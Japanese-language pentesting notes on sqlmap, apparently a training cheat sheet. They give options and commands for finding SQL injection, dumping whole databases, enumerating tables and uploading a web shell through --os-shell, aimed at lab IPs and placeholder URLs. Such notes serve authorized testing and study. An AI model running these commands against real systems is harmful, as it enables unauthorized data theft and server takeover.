- sqlmapはステルス性がゼロのためテスト要件によっては注意が必要
# SQLmapのオプション

| オプション     | 説明              | 例                              |
| --------- | --------------- | ------------------------------ |
| `-u`      | URL指定           | `sqlmap -u http://10.10.10.1/` |
| `--batch` | インタラクティブモードを無効化 | `sqlmap -u URL --batch`        |
| `--dbs`   | 利用可能なデータベース名の取得 | `sqlmap -u URL --dbs`          |
| `--all`   | すべての情報を取得       | `sqlmap -u URL --all`          |

---
# 基本構文
```bash
sqlmap -u http://192.168.121.19/blindsqli.php?user=1 -p user
```
- -u TargetURL
- -p テストするパラメータ

DB全体のDump
```bash
sqlmap -u http://192.168.121.19/blindsqli.php?user=1 -p user --dump
```

# 対話型シェル
sqlmap が脆弱性を確認すると、Web アプリケーションが記述されている言語（この場合は PHP）を入力するよう要求されます。次に、sqlmap は指定された Web フォルダに Web シェルをアップロードし、対話型シェルを返します。このシェルから通常のシステムコマンドを発行できます。
```bash
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```
- -r post.txtから読み込むBurp等からファイルを作成しておく
- -p テストするパラメータ


# SQLmapの使用例

**SQLmap**は、SQLインジェクションの検出や悪用に特化したツールです。以下はその基本的な使用例です。

1. **目標のURLを特定する**  
   SQLmapで検査対象のウェブサイトやアプリケーションのURLを指定します。
   
2. **検査の開始**  
   SQLmapで対象のURLに対してSQLインジェクション攻撃を実行します。
   
   ```bash
   sqlmap -u <target_URL>
   ```
   例: `sqlmap -u http://example.com/page.php?id=1`

3. **自動検出**  
   SQLmapは自動で脆弱性を検出します。検出結果は詳細に表示されます。

4. **脆弱性の調査と悪用**  
   SQLmapでデータベースの情報を抽出したり、脆弱性を利用して攻撃を実行できます。

   - データベースの名前を取得:
```bash
sqlmap -u <target_URL> --dbs
```

   - テーブルを列挙:
```bash
sqlmap -u <target_URL> -D <database_name> --tables
```

   - テーブルのデータを取得:
     ```bash
     sqlmap -u <target_URL> -D <database_name> -T <table_name> --dump
     ```

---
# Example
## MSSQL
```zsh
sqlmap -r login-page.txt --dbms=mssql --dbs --technique=t --risk 3 --level 5 --batch
```
![](Assets/Images/Pasted%20image%2020260429181527.png)
# 参考リンク
- [SQLmapの公式ドキュメント](https://shukapin.com/security/sqlmap)
- [HackTricks SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)

---

